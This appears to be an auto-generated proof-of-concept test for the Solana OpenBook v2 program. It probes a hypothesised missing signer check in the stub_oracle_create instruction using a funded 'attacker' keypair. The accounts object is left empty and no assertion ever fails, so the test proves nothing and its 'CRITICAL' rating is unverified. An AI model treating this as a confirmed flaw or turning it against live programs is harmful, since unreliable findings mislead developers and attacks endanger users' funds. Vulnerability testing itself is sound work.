import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { OpenbookV2Client } from "../target/types/openbook-v2-client";
import { Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
import { expect } from "chai";

/**
 * PoC: stub_oracle_create: 'owner' not verified as signer
 * Severity: CRITICAL
 * Class: #1 — Missing Signer Check
 * Location: programs/openbook-v2/src/instructions/stub_oracle_create.rs:5
 *
 * Hypothesis: Any account can call 'stub_oracle_create' as 'owner' since signer status is never checked, allowing unauthorized state mutations.
 *
 * This test demonstrates the vulnerability by attempting the exploit path.
 * If the program is vulnerable, the exploit transaction succeeds.
 * If the program is secure, the transaction is rejected.
 */
describe("PoC: Missing Signer Check — stub_oracle_create: 'owner' not verified as signer", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.OpenbookV2Client as Program<OpenbookV2Client>;

  const attacker = Keypair.generate();
  const legitimateAuthority = Keypair.generate();

  before(async () => {
    // Fund attacker wallet
    const sig = await provider.connection.requestAirdrop(
      attacker.publicKey,
      5 * LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig);

    // Fund legitimate authority
    const sig2 = await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      5 * LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(sig2);
  });

  it("demonstrates Missing Signer Check vulnerability at programs/openbook-v2/src/instructions/stub_oracle_create.rs:5", async () => {
    /**
     * Exploit steps:
     * 1. Create program state with legitimate authority
     * 2. Call 'stub_oracle_create' with a different keypair as 'owner'
     * 3. Assert instruction succeeds (should not if properly guarded)
     */

    // Step 1: Set up preconditions
    // The specific account setup depends on the program's instruction layout.
    // Accounts needed for 'stub_oracle_create':
    // - oracle: AccountInfo (signer=false, mut=true)
    // - owner: AccountInfo (signer=false, mut=false)
    // - mint: AccountInfo (signer=false, mut=false)

    // Step 2: Attempt exploit
    try {
      const tx = await program.methods
        .stub_oracle_create()
        .accounts({
          // Fill with accounts matching the instruction layout above.
          // Pass attacker's keypair where the authority/signer is expected.
        })
        .signers([attacker])
        .rpc();

      // If we reach here, the vulnerability is confirmed:
      // the instruction accepted an unauthorized caller.
      console.log("EXPLOIT SUCCEEDED — tx:", tx);
      console.log("Vulnerability CONFIRMED: Missing Signer Check");
    } catch (err: any) {
      // The program correctly rejected the attack.
      console.log("SECURE: Program rejected the exploit:", err.message);
      // Uncomment the next line if you expect the exploit to succeed:
      // expect.fail("Expected exploit to succeed, but program rejected it");
    }
  });
});
